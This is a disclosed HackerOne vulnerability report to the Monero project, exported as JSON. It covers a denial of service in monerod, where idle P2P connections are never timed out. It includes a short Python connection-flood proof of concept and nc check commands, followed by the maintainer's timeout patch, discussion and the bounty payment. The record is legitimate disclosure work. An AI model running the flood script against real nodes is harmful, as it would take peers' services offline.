{"id":543782,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDM3ODI=","url":"https://hackerone.com/reports/543782","title":"Excessive Resource Usage","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-04-20T08:09:39.498Z","submitted_at":"2019-04-20T08:09:39.498Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"talko","url":"/talko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/NthP3uSi95kvXh9uxSQa9tGS/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7731,"url":"https://hackerone.com/monero","handle":"monero","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Monero","twitter_handle":"monero","website":"https://getmonero.org","about":" Monero: the secure, private, untraceable cryptocurrency"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-07-03T00:12:59.562Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-02T23:51:20.043Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nUnbounded resource usage due to open one file descriptor per connection, Python script below is effectively a threadbomb on the destination and uses all available memory on the server, clients not sending anything are never terminated.\n\n## Steps To Reproduce:\nUp our daemon\n```\n% monerod\n```\nCheck if peer accepting connection\n```\n% nc -vz 127.0.0.1 18080\nConnection to 127.0.0.1 18080 port [tcp/*] succeeded!\n```\nCreate python script ex: resus.py\n```python\nimport resource\nimport socket\nimport time\n\nresource.setrlimit(resource.RLIMIT_NOFILE, (131072, 131072))\n\nconn = []\n\nwhile True:\n    try:\n        conn.append(socket.create_connection((\"127.0.0.1\", 18080)))\n    except BaseException as err:\n        print(err)\n        break\n\nprint(len(conn))\n\nwhile True:\n    time.sleep(1)\n```\nrun the script as ROOT(required for setting RLIMIT)\n```\n% sudo python resus.py\n```\nwait up 2 to minutes then run netcat again to check if our socket request bomb deny the service\n```\n% nc -vz 127.0.0.1 18080\n```\nnow it's completely hang, during waiting you can run command ```lsof -i tcp``` to see lot of Monero connections\n\n## Impact\n\nDenial of Service(Allocation of Resources Without Limits or Throttling)","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eUnbounded resource usage due to open one file descriptor per connection, Python script below is effectively a threadbomb on the destination and uses all available memory on the server, clients not sending anything are never terminated.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eUp our daemon\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e% monerod\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheck if peer accepting connection\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e% nc -vz 127.0.0.1 18080\nConnection to 127.0.0.1 18080 port [tcp/*] succeeded!\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCreate python script ex: resus.py\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eresource\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esocket\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eresource\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esetrlimit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eresource\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eRLIMIT_NOFILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e131072\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e131072\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003econn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"k\"\u003etry\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003econn\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecreate_connection\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;127.0.0.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e18080\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eexcept\u003c/span\u003e \u003cspan class=\"nb\"\u003eBaseException\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003econn\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003erun the script as ROOT(required for setting RLIMIT)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e% sudo python resus.py\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewait up 2 to minutes then run netcat again to check if our socket request bomb deny the service\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e% nc -vz 127.0.0.1 18080\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003enow it\u0026#39;s completely hang, during waiting you can run command \u003ccode\u003elsof -i tcp\u003c/code\u003e to see lot of Monero connections\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of Service(Allocation of Resources Without Limits or Throttling)\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-01T23:51:20.177Z","allow_singular_disclosure_after":-44519156.81453843,"singular_disclosure_allowed":true,"vote_count":9,"voters":["mygf","cr4xerbik4sh","tems","cryptographer","armansameer","alex2017","illfated","shay1995a","bashfoot"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4606440,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good catch. P2P connections are indeed not not closed by the timeout system, as they have their own, but it only starts after handshake.\nI made this patch, which fixes this, and also uses a much shorter timeout at connection start, to ensure we actually start receiving something.\nAdditionally, this disables the timeout halving based on peer address if we're not under any fd pressure, as this could prevent Tor nodes from working well. The actual values are really plucked from the air. This is a known general thing in Monero: it does not handle network pressure well, and these are just rough mitigations. Hopefully someone who's familiar with networking pops up and tweaks al that :)\n\n```\ndiff --git a/contrib/epee/include/net/abstract_tcp_server2.inl b/contrib/epee/include/net/abstract_tcp_server2.inl\nindex 821594355..d26305ccd 100644\n--- a/contrib/epee/include/net/abstract_tcp_server2.inl\n+++ b/contrib/epee/include/net/abstract_tcp_server2.inl\n@@ -54,6 +54,8 @@\n #undef MONERO_DEFAULT_LOG_CATEGORY\n #define MONERO_DEFAULT_LOG_CATEGORY \"net\"\n \n+#define AGGRESSIVE_TIMEOUT_THRESOLD 120 // sockets\n+#define NEW_CONNECTION_TIMEOUT 10000 // 10 seconds\n #define DEFAULT_TIMEOUT_MS_LOCAL 1800000 // 30 minutes\n #define DEFAULT_TIMEOUT_MS_REMOTE 300000 // 5 minutes\n #define TIMEOUT_EXTRA_MS_PER_BYTE 0.2\n@@ -189,7 +191,7 @@ PRAGMA_WARNING_DISABLE_VS(4355)\n \n     m_protocol_handler.after_init_connection();\n \n-    reset_timer(get_default_timeout(), false);\n+    reset_timer(boost::posix_time::milliseconds(NEW_CONNECTION_TIMEOUT), false);\n \n     // first read on the raw socket to detect SSL for the server\n     buffer_ssl_init_fill = 0;\n@@ -691,7 +693,7 @@ PRAGMA_WARNING_DISABLE_VS(4355)\n   {\n     unsigned count;\n     try { count = host_count(m_host); } catch (...) { count = 0; }\n-    const unsigned shift = std::min(std::max(count, 1u) - 1, 8u);\n+    const unsigned shift = get_state().sock_count \u003e AGGRESSIVE_TIMEOUT_THRESOLD ? std::min(std::max(count, 1u) - 1, 8u) : 0;\n     boost::posix_time::milliseconds timeout(0);\n     if (m_local)\n       timeout = boost::posix_time::milliseconds(DEFAULT_TIMEOUT_MS_LOCAL \u003e\u003e shift);\n@@ -730,8 +732,6 @@ PRAGMA_WARNING_DISABLE_VS(4355)\n   template\u003cclass t_protocol_handler\u003e\n   void connection\u003ct_protocol_handler\u003e::reset_timer(boost::posix_time::milliseconds ms, bool add)\n   {\n-    if (m_connection_type != e_connection_type_RPC)\n-      return;\n     MTRACE(\"Setting \" \u003c\u003c ms \u003c\u003c \" expiry\");\n     auto self = safe_shared_from_this();\n     if(!self)\n```","markdown_message":"\u003cp\u003eGood catch. P2P connections are indeed not not closed by the timeout system, as they have their own, but it only starts after handshake.\u003cbr\u003e\nI made this patch, which fixes this, and also uses a much shorter timeout at connection start, to ensure we actually start receiving something.\u003cbr\u003e\nAdditionally, this disables the timeout halving based on peer address if we\u0026#39;re not under any fd pressure, as this could prevent Tor nodes from working well. The actual values are really plucked from the air. This is a known general thing in Monero: it does not handle network pressure well, and these are just rough mitigations. Hopefully someone who\u0026#39;s familiar with networking pops up and tweaks al that :)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/contrib/epee/include/net/abstract_tcp_server2.inl b/contrib/epee/include/net/abstract_tcp_server2.inl\nindex 821594355..d26305ccd 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/contrib/epee/include/net/abstract_tcp_server2.inl\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/contrib/epee/include/net/abstract_tcp_server2.inl\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -54,6 +54,8 @@\u003c/span\u003e\n #undef MONERO_DEFAULT_LOG_CATEGORY\n #define MONERO_DEFAULT_LOG_CATEGORY \u0026quot;net\u0026quot;\n\n+#define AGGRESSIVE_TIMEOUT_THRESOLD 120 // sockets\n\u003cspan class=\"gi\"\u003e+#define NEW_CONNECTION_TIMEOUT 10000 // 10 seconds\n\u003c/span\u003e #define DEFAULT_TIMEOUT_MS_LOCAL 1800000 // 30 minutes\n #define DEFAULT_TIMEOUT_MS_REMOTE 300000 // 5 minutes\n #define TIMEOUT_EXTRA_MS_PER_BYTE 0.2\n\u003cspan class=\"p\"\u003e@@ -189,7 +191,7 @@\u003c/span\u003e PRAGMA_WARNING_DISABLE_VS(4355)\n\n     m_protocol_handler.after_init_connection();\n\n-    reset_timer(get_default_timeout(), false);\n\u003cspan class=\"gi\"\u003e+    reset_timer(boost::posix_time::milliseconds(NEW_CONNECTION_TIMEOUT), false);\n\u003c/span\u003e\n     // first read on the raw socket to detect SSL for the server\n     buffer_ssl_init_fill = 0;\n\u003cspan class=\"p\"\u003e@@ -691,7 +693,7 @@\u003c/span\u003e PRAGMA_WARNING_DISABLE_VS(4355)\n   {\n     unsigned count;\n     try { count = host_count(m_host); } catch (...) { count = 0; }\n\u003cspan class=\"gd\"\u003e-    const unsigned shift = std::min(std::max(count, 1u) - 1, 8u);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    const unsigned shift = get_state().sock_count \u0026gt; AGGRESSIVE_TIMEOUT_THRESOLD ? std::min(std::max(count, 1u) - 1, 8u) : 0;\n\u003c/span\u003e     boost::posix_time::milliseconds timeout(0);\n     if (m_local)\n       timeout = boost::posix_time::milliseconds(DEFAULT_TIMEOUT_MS_LOCAL \u0026gt;\u0026gt; shift);\n\u003cspan class=\"p\"\u003e@@ -730,8 +732,6 @@\u003c/span\u003e PRAGMA_WARNING_DISABLE_VS(4355)\n   template\u0026lt;class t_protocol_handler\u0026gt;\n   void connection\u0026lt;t_protocol_handler\u0026gt;::reset_timer(boost::posix_time::milliseconds ms, bool add)\n   {\n\u003cspan class=\"gd\"\u003e-    if (m_connection_type != e_connection_type_RPC)\n-      return;\n\u003c/span\u003e     MTRACE(\u0026quot;Setting \u0026quot; \u0026lt;\u0026lt; ms \u0026lt;\u0026lt; \u0026quot; expiry\u0026quot;);\n     auto self = safe_shared_from_this();\n     if(!self)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-20T12:22:43.246Z","updated_at":"2019-04-20T12:24:13.464Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4607228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"i don't know if there is standard or even RFC yet but some open source project follows libevent's 50 seconds timeout rules and 10s of yours a bit restricted for low bandwidth connection.","markdown_message":"\u003cp\u003ei don\u0026#39;t know if there is standard or even RFC yet but some open source project follows libevent\u0026#39;s 50 seconds timeout rules and 10s of yours a bit restricted for low bandwidth connection.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-20T15:23:09.484Z","updated_at":"2019-04-20T15:23:09.484Z","actor":{"username":"talko","cleared":true,"url":"/talko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NthP3uSi95kvXh9uxSQa9tGS/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4608048,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-20T21:57:16.338Z","updated_at":"2019-04-20T21:57:16.338Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4608442,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is example of project that follows libevent https://github.com/facebook/hhvm/blob/53098c4b1be3bedf710825666ab6e447ee77b74f/hphp/runtime/server/proxygen/proxygen-server.cpp?fbclid=IwAR3UDcOOL7t4tn9anULiChea4Tt1F1PAIflXNQOYNvNWvjM4drutAwxmaUc#L189-L199\nAlso happen in Nginx and Apache's httpd as well\n\nIf you really want to fix FD pressure, using libevent can recover so it doesn't hang when FDs are full otherwise it requires lot of work ","markdown_message":"\u003cp\u003eHere is example of project that follows libevent \u003ca title=\"https://github.com/facebook/hhvm/blob/53098c4b1be3bedf710825666ab6e447ee77b74f/hphp/runtime/server/proxygen/proxygen-server.cpp?fbclid=IwAR3UDcOOL7t4tn9anULiChea4Tt1F1PAIflXNQOYNvNWvjM4drutAwxmaUc#L189-L199\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffacebook%2Fhhvm%2Fblob%2F53098c4b1be3bedf710825666ab6e447ee77b74f%2Fhphp%2Fruntime%2Fserver%2Fproxygen%2Fproxygen-server.cpp%3Ffbclid%3DIwAR3UDcOOL7t4tn9anULiChea4Tt1F1PAIflXNQOYNvNWvjM4drutAwxmaUc%23L189-L199\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/facebook/hhvm/blob/53098c4b1be3bedf710825666ab6e447ee77b74f/hphp/runtime/server/proxygen/proxygen-server.cpp?fbclid=IwAR3UDcOOL7t4tn9anULiChea4Tt1F1PAIflXNQOYNvNWvjM4drutAwxmaUc#L189-L199\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nAlso happen in Nginx and Apache\u0026#39;s httpd as well\u003c/p\u003e\n\n\u003cp\u003eIf you really want to fix FD pressure, using libevent can recover so it doesn\u0026#39;t hang when FDs are full otherwise it requires lot of work \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-21T01:03:51.640Z","updated_at":"2019-04-21T01:03:51.640Z","actor":{"username":"talko","cleared":true,"url":"/talko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NthP3uSi95kvXh9uxSQa9tGS/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4615170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The 10 seconds is for receiving data after the connection. After that it can go up to a lot more.\nThanks for the hint about libevent, I've added it to my list of things to look at.","markdown_message":"\u003cp\u003eThe 10 seconds is for receiving data after the connection. After that it can go up to a lot more.\u003cbr\u003e\nThanks for the hint about libevent, I\u0026#39;ve added it to my list of things to look at.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-22T15:40:26.811Z","updated_at":"2019-04-22T15:40:26.811Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4621840,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For what it's worth, libevent has been used by Tor for a very long time now (it's developed/maintained by Nick, one of the lead devs). Additionally, there's potential for an in-depth epee refactor to help mitigate future issues.\n\nWith that said, I hardly think adding yet another library/dependency to monero is an adequate solution. And gutting-out Kohlhoff's ASIO to hack-in libevent? Or even worse, layering libevent on top of ASIO?... Certainly there are better solutions?\n\n\u003eThis is a known general thing in Monero: it does not handle network pressure well, and these are just rough mitigations. Hopefully someone who's familiar with networking pops up and tweaks al that :)\n\nStay tuned :)","markdown_message":"\u003cp\u003eFor what it\u0026#39;s worth, libevent has been used by Tor for a very long time now (it\u0026#39;s developed/maintained by Nick, one of the lead devs). Additionally, there\u0026#39;s potential for an in-depth epee refactor to help mitigate future issues.\u003c/p\u003e\n\n\u003cp\u003eWith that said, I hardly think adding yet another library/dependency to monero is an adequate solution. And gutting-out Kohlhoff\u0026#39;s ASIO to hack-in libevent? Or even worse, layering libevent on top of ASIO?... Certainly there are better solutions?\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis is a known general thing in Monero: it does not handle network pressure well, and these are just rough mitigations. Hopefully someone who\u0026#39;s familiar with networking pops up and tweaks al that :)\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eStay tuned :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-22T23:47:42.779Z","updated_at":"2019-04-22T23:47:42.779Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5241307,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI the above patch was committed in https://github.com/monero-project/monero/commit/bc09766bf9865a658ef451fc55fe313540abf449 and is available in the current 0.14.1.0 release. @talko are you satisfied with the results?\n\n@talko also, please paste an XMR address if you wish to receive bounty, thank you.","markdown_message":"\u003cp\u003eFYI the above patch was committed in \u003ca title=\"https://github.com/monero-project/monero/commit/bc09766bf9865a658ef451fc55fe313540abf449\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fcommit%2Fbc09766bf9865a658ef451fc55fe313540abf449\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/commit/bc09766bf9865a658ef451fc55fe313540abf449\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and is available in the current 0.14.1.0 release. \u003ca href=\"/talko\"\u003e@talko\u003c/a\u003e are you satisfied with the results?\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/talko\"\u003e@talko\u003c/a\u003e also, please paste an XMR address if you wish to receive bounty, thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-02T20:33:00.191Z","updated_at":"2019-07-02T20:33:00.191Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5241444,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's fine\n```\n4EbeCVKSQiA8a6T5MGChxTUcrsHkXkF2jALGjumdMTto9hzPwqydpVed5p3DdRUkfBJ4RVfwQwpKuPidmBb7oPuRVoodvTHYzwZ2UwfnF9\n```\nThank you for the bounty.","markdown_message":"\u003cp\u003eIt\u0026#39;s fine\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e4EbeCVKSQiA8a6T5MGChxTUcrsHkXkF2jALGjumdMTto9hzPwqydpVed5p3DdRUkfBJ4RVfwQwpKuPidmBb7oPuRVoodvTHYzwZ2UwfnF9\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThank you for the bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-02T21:17:27.210Z","updated_at":"2019-07-02T21:17:27.210Z","actor":{"username":"talko","cleared":true,"url":"/talko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NthP3uSi95kvXh9uxSQa9tGS/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5241847,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-02T23:03:06.780Z","updated_at":"2019-07-02T23:03:06.780Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"talko","url":"/talko"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5242029,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"You're welcome. I've notified luigi and he should be sending bounty when he's available to do so.\n\nIn the meantime, we can disclose this report. Thank you again, @talko.","markdown_message":"\u003cp\u003eYou\u0026#39;re welcome. I\u0026#39;ve notified luigi and he should be sending bounty when he\u0026#39;s available to do so.\u003c/p\u003e\n\n\u003cp\u003eIn the meantime, we can disclose this report. Thank you again, \u003ca href=\"/talko\"\u003e@talko\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-02T23:51:20.080Z","updated_at":"2019-07-02T23:51:20.080Z","first_to_agree":true,"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5242099,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-03T00:12:59.525Z","updated_at":"2019-07-03T00:12:59.525Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5255912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sent 3 XMR: \u003c208583b940efa937cb5b6599442e9cb8f1e605715ad6008eb13c51441ffa0d77\u003e","markdown_message":"\u003cp\u003eSent 3 XMR: \u0026lt;208583b940efa937cb5b6599442e9cb8f1e605715ad6008eb13c51441ffa0d77\u0026gt;\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-04T19:38:43.747Z","updated_at":"2019-07-04T19:38:43.747Z","actor":{"username":"luigi1111w","cleared":false,"url":"/luigi1111w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5262027,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-05T22:17:30.256Z","updated_at":"2019-07-05T22:17:30.256Z","actor":{"url":"/monero","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Monero"}},"reporter":{"username":"talko","url":"/talko"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":fals